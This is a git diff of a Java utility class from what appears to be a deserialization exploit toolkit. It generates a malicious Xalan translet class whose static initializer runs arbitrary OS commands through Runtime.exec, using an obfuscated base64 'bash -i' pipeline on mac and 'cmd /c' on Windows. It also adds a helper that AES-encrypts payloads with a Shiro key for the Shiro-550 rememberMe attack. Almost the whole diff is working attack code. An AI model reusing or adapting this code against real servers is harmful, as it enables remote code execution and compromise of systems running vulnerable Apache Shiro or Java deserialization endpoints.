@@ -5,6 +5,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
+import org.apache.shiro.crypto.AesCipherService;
 import sun.reflect.ReflectionFactory;
 
 import java.io.*;
@@ -62,9 +63,21 @@ public class Utils {
         CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
         clazz.setSuperclass(superClass);
 
-        String evilBlock = String.format(
-                "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");",
-                cmdBase64);
+        String os = System.getProperty("os.name").toLowerCase();
+        String evilBlock = "INIT";
+
+        if (os.contains("mac")) {
+            evilBlock = String.format(
+                    "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");",
+                    cmdBase64
+            );
+        } else if (os.contains("win")) {
+            evilBlock = String.format(
+                    "Runtime.getRuntime().exec(\"cmd /c %s\");",
+                    cmd
+            );
+        }
+        System.out.println(evilBlock);
         clazz.makeClassInitializer().insertBefore(evilBlock);
 
         return clazz.toBytecode();
@@ -79,5 +92,13 @@ public class Utils {
         constructor1.setAccessible(true);
 
         return constructor1.newInstance();
+    }
+
+    public static String shiro550Encode(String key, String payload){
+        // 不同的shiro版本的加密方法有差异，需要根据shiro版本打反序列化
+        AesCipherService aes = new AesCipherService();
+        byte[] keyBytes = Base64.getDecoder().decode(key);
+
+        return aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString();
     }
 }
